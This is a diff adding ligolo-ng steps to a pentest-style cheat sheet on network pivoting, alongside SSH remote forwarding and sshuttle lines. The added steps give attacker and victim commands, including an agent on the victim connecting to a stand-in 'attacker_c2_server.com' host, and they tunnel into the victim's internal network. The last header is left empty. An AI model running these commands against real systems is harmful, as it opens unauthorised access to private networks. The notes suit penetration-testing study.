@@ -17,3 +17,35 @@ ssh -N -R <tcp_port> <kali_machine_ssh_user>@<kali_machine_ip>
 
 ### SSHuttle
 sshuttle -r <accessible_machine_ssh_user>@<accessible_machine_ip>:<tcp_port> <10.4.50.0/24> <172.16.50.0/24>
+
+### ligolo-ng
+#### STEP-1 (Attacker side)
+sudo ip tuntap add user [your_username] mode tun ligolo
+sudo ip link set ligolo up
+#### STEP-2 (Attacker side: Running proxy server)
+$ ./proxy -selfcert
+#### STEP-3 (Victim side: Running agent)
+$ ./agent -connect attacker_c2_server.com:11601 -ignore-cert
+#### STEP-4 (Attacker side: Select session)
+ligolo-ng » session 
+? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
+#### STEP-5 (Attacker side: Looking for network interface once connection is established from the above command)
+[Agent : nchatelain@nworkstation] » ifconfig 
+[...]
+┌─────────────────────────────────────────────┐
+│ Interface 3                                 │
+├──────────────┬──────────────────────────────┤
+│ Name         │ wlp3s0                       │
+│ Hardware MAC │ de:ad:be:ef:ca:fe            │
+│ MTU          │ 1500                         │
+│ Flags        │ up|broadcast|multicast       │
+│ IPv4 Address │ 192.168.0.30/24             │
+└──────────────┴──────────────────────────────┘
+#### STEP-6 (Attacker side: Add a route on the proxy/relay server to the 192.168.0.0/24 agent network.)
+$ sudo ip route add 192.168.0.0/24 dev ligolo
+#### STEP-7: (Attacker side: Start the proxy)
+[Agent : nchatelain@nworkstation] » start
+[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation 
+You can now access the 192.168.0.0/24 agent network from the proxy server. 
+
+#### STEP-5 ()
